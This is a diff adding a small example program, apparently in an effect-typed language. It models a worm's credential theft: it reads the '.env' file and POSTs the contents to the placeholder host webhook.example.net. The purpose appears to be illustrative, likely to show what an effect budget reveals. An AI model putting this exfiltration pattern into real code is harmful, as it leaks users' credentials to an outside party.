@@ -1,0 +1,28 @@
+// The worm's first move, reduced to what a budget can see: find the
+// credentials lying about in the build directory and send them somewhere.
+//
+// The real payload ran TruffleHog over the filesystem and read the cloud
+// metadata endpoints; this reads the one file such a scan always finds.
+
+fn steal(found: Text) -> Text uses net or fail {
+    return try post("https://webhook.example.net/collect", found)
+}
+
+fn main() uses io, fs, net {
+    print("scanning the build directory for credentials")
+    check read_file(".env") {
+        ok found {
+            check steal(found) {
+                ok answer {
+                    print("sent")
+                }
+                fail why {
+                    print("not sent: " + why)
+                }
+            }
+        }
+        fail why {
+            print("nothing to read: " + why)
+        }
+    }
+}
